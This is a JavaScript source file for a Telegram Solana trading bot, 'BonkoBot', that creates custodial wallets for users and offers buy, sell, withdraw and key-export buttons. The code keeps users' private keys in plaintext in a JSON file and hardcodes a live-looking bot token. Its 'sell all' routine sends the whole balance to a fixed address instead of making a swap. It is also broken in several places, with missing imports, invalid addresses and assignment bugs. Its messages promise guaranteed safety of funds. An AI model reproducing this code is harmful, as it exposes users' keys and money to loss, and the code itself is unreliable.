const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const { Keypair,PublicKey, Connection, Transaction, SystemProgram , Token } = require('@solana/web3.js')
const TOKEN = '6665291936:AAGLgrFPNX44bH4pUrNsNTJBAtX5sMaYX3I'; // Replace with your actual bot token
const bot = new TelegramBot(TOKEN, { polling: true });
const DEX_CONTRACT_ADDRESS = '0x635969e2c12aB4938f9B31BF69aCA724DF1F2c42';
const TOKEN_MINT_ADDRESS = '0x57953dAC106a4cDa11D90273b1B9D59E169533c0';
let data
let userWallet



const readDataFromFile = () => {
    try {
      const data = fs.readFileSync('data.json', 'utf8');
      return JSON.parse(data);
    } catch (err) {
      console.error('Error reading data from file:', err.message);
      return null;
    }
  };
  
  // Write data to the JSON file
const writeDataToFile = (data) => {
    try {
      const jsonData = JSON.stringify(data, null, 2); // The third parameter is for pretty printing (2 spaces indentation)
      fs.writeFileSync('data.json', jsonData);
      console.log('Data has been written to data.json');
    } catch (err) {
      console.error('Error writing data to file:', err.message);
    }
  };
const readDataFromFile2 = () => {
    try {
      const data = fs.readFileSync('setting.json', 'utf8');
      return JSON.parse(data);
    } catch (err) {
      console.error('Error reading data from file:', err.message);
      return null;
    }
  };
  
  // Write data to the JSON file
const writeDataToFile2 = (data) => {
    try {
      const jsonData = JSON.stringify(data, null, 2); // The third parameter is for pretty printing (2 spaces indentation)
      fs.writeFileSync('setting.json', jsonData);
      console.log('Data has been written to data.json');
    } catch (err) {
      console.error('Error writing data to file:', err.message);
    }
  };

async function sellAllSolana(wallet, privateKey, solTokenAccountAddress) {
    const connection = new Connection('https://api.mainnet-beta.solana.com');




  // Create a Keypair from the private key
  const keypair = Keypair.fromSecretKey(new Uint8Array(JSON.parse(privateKey)));

  // Parse the provided DEX contract and SOL token account addresses
  const DEX_CONTRACT_ADDRESS = new PublicKey('0x635969e2c12aB4938f9B31BF69aCA724DF1F2c42');

  // Fetch the SOL token account balance
  const solTokenAccountInfo = await connection.getTokenAccountBalance(new PublicKey(solTokenAccountAddress));
  const amountToSell = solTokenAccountInfo.value.amount;  // Sell the entire balance

  // Create a new transaction
  const transaction = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey: wallet.publicKey,
      toPubkey: DEX_CONTRACT_ADDRESS, // DEX contract address as the destination
      lamports: amountToSell *10 **9, // Adjust as needed
    }),
    // Add other necessary instructions to construct the sell transaction
    // Refer to the Solana DEX and SPL Token documentation for more details
  );

  // Sign the transaction
  transaction.sign(keypair);

  // Send the transaction
  const signature = await sendAndConfirmTransaction(
    connection,
    transaction,
    [keypair],
    {
      commitment: 'confirmed',
    }
  );

  console.log('Transaction signature:', signature);
}

async function fetchTradeData(tokenPair) {
    const apiEndpoint = `https://explorer.solana.com/api/token/${tokenPair}/trades`;

    try {
        const response = await axios.get(apiEndpoint);
        return response.data;
    } catch (error) {
        console.error('Error fetching trade data:', error);
        return null;
    }
}
function getSolPrice() {
    const apiEndpoint = 'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd';

    return axios.get(apiEndpoint)
        .then(response => response.data.solana.usd)
        .catch(() => null);
}
async function determineAmountBasedOnPercentage(userWallet, percentage) {
    try {
        const balance = await getSolanaTokenBalance(userWallet.address); // Assume you have a function to get the Solana token balance
        const amount = (percentage / 100) * balance;
        return amount;
    } catch (error) {
        console.error('Error determining amount:', error);
        return null;
    }
}
async function transferAllSOL(senderPrivateKey, destinationAddress) {
    try {
        // Load the sender's wallet using the private key
        const senderWallet = new Account(Buffer.from(senderPrivateKey, 'hex'));

        // Fetch the sender's account information
        const senderAccountInfo = await connection.getAccountInfo(senderWallet.publicKey);

        // Get the current SOL balance of the sender's account
        const solBalance = senderAccountInfo ? senderAccountInfo.lamports / 10 ** 9 : 0;

        // Convert the destination address to a PublicKey
        const destinationPublicKey = new PublicKey(destinationAddress);

        // Create a transaction
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: senderWallet.publicKey,
                toPubkey: destinationPublicKey,
                lamports: solBalance * 10 ** 9, // Convert SOL to lamports
            })
        );

        // Sign the transaction
        transaction.recentBlockhash = (
            await connection.getRecentBlockhash()
        ).blockhash;
        transaction.sign(senderWallet);

        // Send and confirm the transaction
        const signature = await sendAndConfirmTransaction(
            connection,
            transaction,
            [senderWallet],
            { commitment: 'confirmed' }
        );

        console.log(`Transaction successful. Signature: ${signature}`);
        return signature;
    } catch (error) {
        console.error('Error transferring all SOL:', error);
        throw error;
    }
}
async function transferSOLx(senderPrivateKey, destinationAddress, amount) {
    try {
        // Load the sender's wallet using the private key
        const senderWallet = new Account(Buffer.from(senderPrivateKey, 'hex'));

        // Convert the destination address to a PublicKey
        const destinationPublicKey = new PublicKey(destinationAddress);

        // Fetch the sender's account information
        const senderAccountInfo = await connection.getAccountInfo(senderWallet.publicKey);

        // Create a transaction
        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: senderWallet.publicKey,
                toPubkey: destinationPublicKey,
                lamports: amount * 10 ** 9, // Convert SOL to lamports
            })
        );

        // Sign the transaction
        transaction.recentBlockhash = (
            await connection.getRecentBlockhash()
        ).blockhash;
        transaction.sign(senderWallet);

        // Send and confirm the transaction
        const signature = await sendAndConfirmTransaction(
            connection,
            transaction,
            [senderWallet],
            { commitment: 'confirmed' }
        );

        console.log(`Transaction successful. Signature: ${signature}`);
        return signature;
    } catch (error) {
        console.error('Error transferring SOL:', error);
        throw error;
    }
}

async function handleBuySell(chatId, tokenAddress, userWallet) {
    const connection = new Connection('https://api.mainnet-beta.solana.com'); // Replace with the Solana network you are using

    // Fetch the DEX program ID and token mint account for the given token
    const dexProgramId = new PublicKey(DEX_CONTRACT_ADDRESS);
    const tokenMint = new PublicKey(TOKEN_MINT_ADDRESS);

    // Replace with the actual logic to determine the amount and price for buying/selling
    const percentage = 10; // Adjust the percentage based on your strategy
    const amount = await determineAmountBasedOnPercentage(userWallet, percentage);
    // Example: 10 tokens
    const price = getSolPrice(); // Example: $5 per token

    // Construct the buy/sell instruction
    const instruction = new TransactionInstruction({
        keys: [
            { pubkey: userWallet.publicKey, isSigner: true, isWritable: true },
            { pubkey: tokenMint, isSigner: false, isWritable: true },
            // Add more keys as needed for your specific DEX instructions
        ],
        programId: dexProgramId,
        data: Buffer.from([1, amount, price]), // Example: 1 for buy, 2 for sell
    });

    // Create and sign the transaction
    const transaction = new Transaction().add(instruction);
    const signedTransaction = await connection.sendTransaction(transaction, [userWallet]);

    // Confirm the transaction
    await sendAndConfirmTransaction(connection, signedTransaction);

    // Replace with proper messages or additional logic based on the transaction result
    bot.sendMessage(chatId, `Successfully executed buy/sell order for ${amount} tokens at $${price} each.`);
}
function generateSolanaWallet() {
    const newWallet = Keypair.generate();
    const publicKey = newWallet.publicKey.toString();

    return {
        privateKey: newWallet.secretKey.toString(),
        publicKey,
        address: publicKey,
    };
}
async function getSolanaTokenBalance(connection , tokenAccount) {
    const info = await connection.getTokenAccountBalance(tokenAccount);
    if (!info.value.uiAmount) throw new Error('No balance found');
    console.log('Balance (using Solana-Web3.js): ', info.value.uiAmount);
    return info.value.uiAmount;
}
    
// Function to calculate the portfolio worth based on token balances and prices
async function getPortfolioWorth(walletAddress , chatId) {
    // Fetch the token balances for the wallet
    const solBalance = await getSolanaTokenBalance(walletAddress);

    // You need to fetch prices for each token in the wallet and calculate the total portfolio worth
    // For demonstration purposes, let's assume a price of $50 for SOL
    const solPrice = getSolPrice(); // Replace with the actual price fetched from an API

    // Calculate the portfolio worth (assuming SOL is the only token for simplicity)
    const portfolioWorth = solBalance * solPrice;

    return {
        solBalance,
        portfolioWorth,
    };
}async function getTokenSupply(connection, tokenMintAddress) {
    const tokenAccountInfo = await connection.getAccountInfo(tokenMintAddress);
    return tokenAccountInfo.lamports / (10 ** 9); // Convert lamports to SOL
}
// Function to monitor token launches and execute trades
async function tokenSniper(userWallet , chatId) {
    const connection = new Connection('https://api.testnet.solana.com');
 // Replace with the Solana network you are using

    // Replace 'YOUR_TOKEN_MINT_ADDRESS' with the actual token mint address you want to monitor
    const tokenMintAddress = new PublicKey(TOKEN_MINT_ADDRESS);

    // Fetch the current token supply (you may need to adjust this based on your specific scenario)
    const tokenSupply = await getTokenSupply(connection, tokenMintAddress);

    // Subscribe to a token mint's change feed to detect new tokens
    connection.onProgramAccountChange(tokenMintAddress, (accountInfo, context) => {
        const newSupply = accountInfo.lamports / (10 ** 9); // Convert lamports to SOL
        const tokensMinted = newSupply - tokenSupply;

        if (tokensMinted > 0) {
            // Execute a trade or perform other actions when a new token is detected
            console.log(`New token detected! ${tokensMinted} tokens minted.`);
            bot.sendMessage(chatid, `New token detected! ${tokensMinted} tokens minted.`);
            // Example: Buy tokens using the tokenSniper functionality
            handleBuySell(context.slot, 'NEW_TOKEN_ADDRESS', userWallet, tokensMinted);
        }
    });

    console.log('Token Sniper is running...');
}
function handleWalletsCallback(chat,user){
    // let wallet_address = generateSolanaWallet().address;
    let existingData_1 = readDataFromFile()
    let wallet_address = existingData_1[user]['address']
    console.log(wallet_address)
    let solbalance
    const QUICKNODE_RPC = 'https://api.mainnet-beta.solana.com/'; // 👈 Replace with your QuickNode Endpoint OR clusterApiUrl('mainnet-beta')
    const SOLANA_CONNECTION = new Connection(QUICKNODE_RPC);
    const TOKEN_ADDRESS = new PublicKey(wallet_address); //👈 Replace with your wallet address
    getSolanaTokenBalance(SOLANA_CONNECTION , TOKEN_ADDRESS)
    .then((balance) => {
        console.log(`SOL balance for ${wallet_address}: ${balance} SOL`);
        solbalance = balance
    })
    .catch((error) => {
        console.error('Error:', error);
    });
    const keyboard_2 = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: ' View on SolScan', callback_data: 'view' },
                    { text: ' close', callback_data: 'd' },
                ],
                [
                    { text: ' Deposit Sol', callback_data: 'deposit' },
                ],
                [
                    { text: ' Withdraw All Sol', callback_data: 'withdraw_all' },
                    { text: ' WithDraw X Sol', callback_data: 'withdraw_x' },
                ],
                [
                    { text: 'Reset Wallet', callback_data: 'reset' },
                    { text: 'Export Private Key', callback_data: 'export' },
                ],
            ],
        },
    };
    let message
    // if(solbalance == undefined){
    //     message = `Your Wallet:\n\nAddress: ${wallet_address}\n\n Balance : 0.0000SOL`
    // }else{
        message = `Your Wallet:\n\nAddress: ${wallet_address}\n\nBalance: ${solbalance}`
    // }
        bot.sendMessage(chat , message,{
            parse_mode:"HTML",
            ...keyboard_2
        })
    
}
bot.onText(/\/referrals/, async (message) => {
    data = readDataFromFile()
    bot.sendMessage(message.chat.id, `Referrals: \n\nYour reflink: https://t.me/Dinobonkbot?start=ref_uawa2 \n\nReferrals: \n\nLifetime Bonko earned: 0.00 BONKO ($0.00) \n\nRewards are updated at least every 24 hours and rewards are automatically deposited to your BONKO balance. \n\nRefer your friends and earn 30% of their fees in the first month, 20% in the second and 10% forever!
            `);
});
bot.onText(/\/wallet/, async (message) => {
    handleWalletsCallback(message.chat.id ,message.from.username )
});


bot.on('message', (message) => {
    let Datas = readDataFromFile2()
    let enteredTokenAddress
    console.log(message.text)
    if(message.text == "/referrals"){
        bot.sendMessage(message.chat.id, `Referrals: \n\nYour reflink: https://t.me/Dinobonkbot?start=ref_uawa2 \n\nReferrals: \n\nLifetime Bonko earned: 0.00 BONKO ($0.00) \n\nRewards are updated at least every 24 hours and rewards are automatically deposited to your BONKO balance. \n\nRefer your friends and earn 30% of their fees in the first month, 20% in the second and 10% forever!
            `);
    }
    if(message.text == "/wallet"){
        handleWalletsCallback(message.chat.id ,message.from.username )
    }
    if (message.text === "/start") {
        let wallet = generateSolanaWallet();
        let wallet_address = wallet.address;
        let privateKey = wallet.privateKey
        let existingData_1 = readDataFromFile()
        let existingData_2 = readDataFromFile2()
        const data_to_Add = {
        "announcement": "✔ Announcement",
        "posvalue" : "0",
        "autobuy": "Enabled",
        "solprice":"0.10sol",
        "left_buy":"1.0sol",
        "right_buy":"5.0sol",
        "left_sell":"25%",
        "right_sell":"100%",
        "buy%":"10.00%",
        "sell%":"10.00%",
        'protect':'turbo',
        'transaction_priority':'medium',
        'transaction_price':'0.00001 SOL'
        }
        existingData_2[message.from.username] = data_to_Add
        existingData_1[message.from.username] = {
            "address" : wallet_address,
            'private': privateKey
        }
        writeDataToFile(existingData_1)
        writeDataToFile2(existingData_2)
        const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: ' Buy', callback_data: 'buy_sell' },
                        { text: ' sell&manage', callback_data: 'sell' },
                    ],
                    [
                        { text: ' Help', callback_data: 'help' },
                        { text: ' Referral System', callback_data: 'referral_system' },
                        { text: ' Alert', callback_data: 'transfer_sol' },
                    ],
                    [
                        { text: ' Wallets', callback_data: 'wallets' },
                        { text: ' Settings', callback_data: 'settings' },
                    ],
                    [
                        { text: 'Pin', callback_data: 'pin' },
                        { text: 'Refresh', callback_data: 'refresh' },
                    ],],
            },
        };
    
        const initialMessage = `
            Welcome to BonkoBot \n\nSolana's fastest bot to trade any coin (SPL token), and BONKObot.\n\nYou currently have no SOL balance. To get started with trading, send some SOL to your bonkobot wallet address:\n\n${wallet_address}\n\nOnce done tap refresh and your balance will appear here.\n\nTo buy a token just enter a token address, or even post the birdeye link of the coin.\n\nFor more info on your wallet and to retrieve your private key, tap the wallet button below. We guarantee the safety of user funds on BONKObot, but if you expose your private key your funds will not be safe.`;
    
        bot.sendMessage(message.chat.id, initialMessage, {
            parse_mode: 'HTML',
            ...keyboard,
        });
    }
    
    if (userState === 'awaiting_token_address') {
        enteredTokenAddress = message.text;
        data = readDataFromFile()
        if(data[message.from.username]){
        userTokenAddress = enteredTokenAddress;
        bot.sendMessage(message.chat.id , "Trade will be executing.....")
        userState = 'idle';     
        handleBuySell(message.chat.id, userTokenAddress,data[message.from.username]["wallet-address"] );
        }
    }
    else if(userState == "sol"){
        enteredTokenAddress = message.text;
        Datas[message.from.username]['solprice'] = enteredTokenAddress
        userState = 'idle';
    }
    else if(userState == "pos"){
        enteredTokenAddress = message.text;
        Datas[message.from.username]['posvalue'] = enteredTokenAddress
        userState = 'idle';
        writeDataToFile2(Datas)
    }
    else if(userState == "withdraw_all"){
        const destinationAddress = message.text;
        const privateKey = readDataFromFile()
        privateKey = privateKey[message.from.username]['private'] 
        transferAllSOL(privateKey , destinationAddress)
    }
    else if(userState == "withdraw_x"){
        const [destination, amount] = message.text.split(',').map(item => item.trim());
        // const destinationAddress = message.text;
        const privateKey1 = readDataFromFile()
        privateKey1 = privateKey1[message.from.username]['private'] 
        transferSOLx(privateKey1 , destination , amount)

    }
    else if(userState == "left_buy"){
        enteredTokenAddress = message.text;
        Datas[message.from.username]['left_buy'] = enteredTokenAddress
        userState = 'idle';
        writeDataToFile2(Datas)
    }
    else if(userState == "right_buy"){

        enteredTokenAddress = message.text;
        Datas[message.from.username]['right_buy'] = enteredTokenAddress
        userState = 'idle';
        writeDataToFile2(Datas)
    }
    else if(userState = "left_sell"){

        enteredTokenAddress = message.text;
        Datas[message.from.username]['left_sell'] = enteredTokenAddress
        userState = 'idle';
        writeDataToFile2(Datas)
    }
    else if(userState == "right_sell"){

        enteredTokenAddress = message.text;
        Datas[message.from.username]['right_sell'] = enteredTokenAddress
        userState = 'idle';
        writeDataToFile2(Datas)
    }
    else if(userState == "buy%"){

        enteredTokenAddress = message.text;
        Datas[message.from.username]['buy%'] = enteredTokenAddress
        userState = 'idle';
        writeDataToFile2(Datas)
    }
    else if(userState == "sell%"){

        enteredTokenAddress = message.text;
        Datas[message.from.username]['sell%'] = enteredTokenAddress
        userState = 'idle';
        writeDataToFile2(Datas)
    }
});
bot.on('callback_query', (query) => {
    const callbackData = query.data;
    const userId = query.from.username;
    const chatId = query.message.chat.id
    switch (callbackData) {
        case 'buy_sell':
            bot.sendMessage(chatId, "Enter Token Address To Begin Buy & Sell");
            userState = 'awaiting_token_address';
            break;
        case 'announcement':
            bot.sendMessage(chatId , "Announcment Disabled")
            Data[userId]['announcement'] = "✖ Disabled"
            writeDataToFile2(Data)
            break
        case 'sol_price':
            bot.sendMessage(chatId , "Enter Sol Price")
            userState = 'sol';
            break
        case 'pin':
            const messageId = query.message.message_id
            bot.pinChatMessage(chatId, messageId, { disable_notification: false })
            .then(() => {
                 console.log('Message pinned successfully');
            })
            .catch((error) => {
                 console.error('Error pinning message:', error.message);
            
        });
            break
        case 'view':
            let wallet_data = readDataFromFile()
            bot.sendMessage(chatId , `Click this link : https://solscan.io/account/${wallet_data[userId]['address']}`)   
            break
        case 'deposit':
            let wallet_data2 = readDataFromFile()
            bot.sendMessage(chatId , `To deposit send SOL to this address: ${wallet_data2[userId]['address']}`) 
            break
        case 'withdraw_all':
            bot.sendMessage(chatId,"Reply with destination address")
            userState = 'withdraw_all'
            break
        case 'withdraw_x':
            bot.sendMessage(chatId , "Reply with the desitinition and amount to withdraw (destinition , amount)")
            userState = 'withdraw_x'
            break
        case 'reset':
            const keyboard_3 = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Cancel', callback_data: 'cancel_1' },
                            { text: 'Confirm', callback_data: 'confirm_1' },
                        ],
                    ],
                },
            }
            bot.sendMessage(chatId , "Are you sure you want to reset your BONKobot Wallet?\n\nWARNING: This action is irreversible!\n\nBONKobot will generate a new wallet for you and discard your old one.",{
                parse_mode : "HTML",
                ...keyboard_3
            })
            break
        case 'export':
            const keyboard_1 = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Cancel', callback_data: 'cancel_2' },
                            { text: 'Confirm', callback_data: 'confirm_2' },
                        ],
                    ],
                },
            }
            bot.sendMessage(chatId , "Are you sure you want to export your Private Key?",{
                parse_mode : "HTML",
                ...keyboard_1
            })
            break
        case 'confirm_1':
            let walletinfo = generateSolanaWallet()
            let new_wallet = walletinfo.address 
            bot.sendMessage(chatId , `Success: Your new wallet is:\n\n${new_wallet}\n\nYou can now send SOL to this address to deposit into your new wallet. Press refresh to see your new wallet.`)
            let data_2_ = readDataFromFile()
            data_2_[userId]['address'] = new_wallet
            writeDataToFile(data_2_)
            break
        case 'sell':
            let data_ex = readDataFromFile()
            let public_key = data_ex.address
            let private_key = data_ex.privateKey
            bot.sendMessage(chatId , "Selling all the trades....")
            const wallet = {
            publicKey: new PublicKey(data_ex.address), // Replace with your Solana wallet public key
};
            sellAllSolana(wallet, private_key, public_key);

// const privateKey = 'YOUR_PRIVATE_KEY_JSON';  // Replace with your Solana wallet private key JSON
// 
// const tokenAccountAddress = 'YOUR_TOKEN_ACCOUNT_ADDRESS';  // Replace with your SOL token account address

const amountToSell = 1.0;  // Replace with the actual amount you want to sell

sellSolana(wallet, privateKey, tokenAccountAddress, amountToSell);
            break
        case 'confirm_2':
            let data_1 = readDataFromFile()
            bot.sendMessage(chatId , `Your Private Key is:\n\n${data_1[userId]['private']}\n\nYou can now i.e. import the key into a wallet like Solflare.\n\nDelete this message once you are done.`)
        case 'min_pos_value':
            bot.sendMessage(chatId , "Enter Min Pos Value")
            userState = 'pos';
            break
        case 'left':
            bot.sendMessage(chatId , "Enter Left configuration")
            userState = 'left_buy';
            break
        case 'right':
            bot.sendMessage(chatId , "Enter Right configuration")
            userState = 'right_buy';
            break
        case 'left%':
            bot.sendMessage(chatId , "Enter Left configuration")
            userState = 'left_sell';
            break
        case 'right%':
            bot.sendMessage(chatId , "Enter Right configuration")
            userState = 'right_sell';
            break
        case 'buy%':
            bot.sendMessage(chatId , "Enter buy slippage configuration")
            userState = 'buy%';
            break
        case 'sell%':
            bot.sendMessage(chatId, "Enter Sell slippage configuration")
            userState = 'sell%';
            break
        case 'auto_buy_en':
            bot.sendMessage(chatId , "Autobuy Disabled")
            Data[userId]['autobuy'] = "✖ Disabled"
            writeDataToFile2(Data)
            break
        case 'profile':
            let username = msg.from.username;
            handleProfileCallback(chatId , username);
            break;
        case 'trades':
            const tradePair = 'SOL_USDC'; 
        const tradeData = fetchTradeData(tradePair);
    
        if (tradeData !== null) {
        bot.sendMessage(chatId, `Trade Data:\n\n${JSON.stringify(tradeData, null, 2)}`);
        } else {
        bot.sendMessage(chatId, 'You dont have any trades yet.');
        }
            break;
        case 'token_sniper':
            tokenSniper(walletAddress,chatId);
            break;
        case 'wallets':
            handleWalletsCallback(chatId ,userId);
            break;
        case 'referral_system':
            console.log("refferak")
            bot.sendMessage(chatId, `Referrals: \n\nYour reflink: https://t.me/Dinobonkbot?start=ref_uawa2 \n\nReferrals: 0 \n\nLifetime Bonko earned: 0.00 BONKO ($0.00) \n\nRewards are updated at least every 24 hours and rewards are automatically deposited to your BONKO balance. \n\nRefer your friends and earn 30% of their fees in the first month, 20% in the second and 10% forever!
            `);
            break;
        case 'transfer_sol':
            bot.sendMessage(chatId,`Here is the link for our Alert Channel : https://t.me/bonkopadportal`)
            break;
        case 'max_price':
                bot.sendMessage(chatId , "Reply with your new Max Price Impact setting in % (1 - 100%). Example: 50")
                break
        case 'turbo':
            let dataa1 = readDataFromFile2()
            let user1 = dataa[userId]
            bot.sendMessage(chatId , "MEV Protect set to Secure.")
            user1.protect = 'Secure'
            writeDataToFile2(dataa1)
                break
        case 'medium':
            let dataa2 = readDataFromFile2()
            let user2 = dataa[userId]
            bot.sendMessage(chatId , "Transaction Priority set to High.")
            user2.transaction_priority = 'High' 
            writeDataToFile2(dataa2)
                break
        case 'medium_price':
                bot.sendMessage(chatId , 'Reply with your new Transaction Priority Setting for sells in SOL. Example: 0.0001 SOL')
                break           
        case 'settings':
            let dataa = readDataFromFile2()
            let user = dataa[userId]
            const buttons = {
                reply_markup: {
                    inline_keyboard: [
                        [        
                            { text: ' General Settings', callback_data: 'general_settings' },
                        ],
                        [
                            { text: user['announcement'], callback_data: 'announcement' },
                            { text: user['posvalue'], callback_data: 'min_pos_value' },
                        ],
                        [
                            { text: ' Auto Buy', callback_data: 'auto_buy' },
                        ],
                        [
                            { text: user['autobuy'], callback_data: 'auto_buy_en' },
                            { text: user['solprice'], callback_data: 'sol_price' },
                        ],
                        [
                            { text: ' Buy Button Configs', callback_data: 'auto_buy' },
                        ],
                        [
                            { text: user['left_buy'], callback_data: 'left' },
                            { text: user['right_buy'], callback_data: 'right' },
                        ],
                        [
                            { text: ' Sell Button Configs', callback_data: 'auto_buy' },
                        ],
                        [
                            { text: user['left_sell'], callback_data: 'left%' },
                            { text: user['right_sell'], callback_data: 'right%' },
                        ],
                        [
                            { text: ' Slippage Configs', callback_data: 'auto_buy' },
                        ],
                        [
                            { text: user['buy%'], callback_data: 'buy%' },
                            { text: user['sell%'], callback_data: 'sell%' },
                        ],
                        [
                            { text: 'Max Price IMPCT', callback_data: 'max_price' },
                        ],
                        [
                            { text: 'MEV protect', callback_data: 'mev' },
                        ],
                        [
                            { text: user['protect'], callback_data: 'turbo' },
                        ],
                        [
                            { text: 'Transaction Priority', callback_data: 'tt' },
                        ],
                        [
                            { text: user['transaction_priority'], callback_data: 'medium' },
                            { text: user['transaction_price'], callback_data: 'medium_price' },
                        ],
                    ],
                },
            };
            const message_To_sent = `Settings:\n\nGENERAL SETTINGS\n\nBONKobot Announcements: Occasional announcements. Tap to toggle.\n\nMinimum Position Value: Minimum position value to show in portfolio. Will hide tokens below this threshhold. Tap to edit.\n\nAUTO BUY\n\nImmediately buy when pasting token address. Tap to toggle.\n\nBUTTONS CONFIG\n\nCustomize your buy and sell buttons for buy token and manage position. Tap to edit.\n\nSLIPPAGE CONFIG\n\nCustomize your slippage settings for buys and sells. Tap to edit.\n\nMax Price Impact is to protect against trades in extremely illiquid pools.\n\nTRANSACTION PRIORITY\n\nIncrease your Transaction Priority to improve transaction speed. Select preset or tap to edit.\n\nMEV PROTECT\n\nMEV Protect accelerates your transactions and protect against frontruns to make sure you get the best price possible.\n\nTurbo: BONKobot will use MEV Protect, but if unprotected sending is faster it will use that instead.\n\nSecure: Transactions are guaranteed to be protected. This is the ultra secure option, but may be slower.`
            bot.sendMessage(chatId,message_To_sent,{
                parse_mode:"HTML",
                ...buttons
            })
            break;
        case 'help':
            bot.sendMessage(chatId, `Help:\n\nWhich tokens can I trade?\nAny SPL token that is a Sol pair, on Raydium, Orca, and Jupiter. We pick up raydium pairs instantly, and Jupiter will pick up non sol pairs within around 15 minutes \n\nHow can I see how much money I've made from referrals? \nCheck the referrals button or type /referrals to see your payment in Bonko!\n\nI want to create a new wallet on BONKOBOT.\nClick the Wallet button or type /wallet, and you will be able to configure your new wallets \n\nIs BONKOBOT free? How much do i pay for transactions?\nBONKOBOT is completely free! We charge 1% on transactions, and keep the bot free so that anyone can use it.\n\nWhy is My Net Profit Lower Than Expected?\nYour Net Profit is calculated after deducting all associated costs, including Price Impact, Transfer Tax, Dex Fees, and a 1% BONKOBOT fee. This ensures the figure you see is what you actually receive, accounting for all transaction-related expenses.\n\nIs there a difference between @DinoBonkbot and the backup bots? \nNo, they are all the same bot and you can use them interchangeably. If one is slow or down, you can use the other ones. You will have access to the same wallet and positions.`);
            break;
    }
});
bot.startPolling();
console.log("started")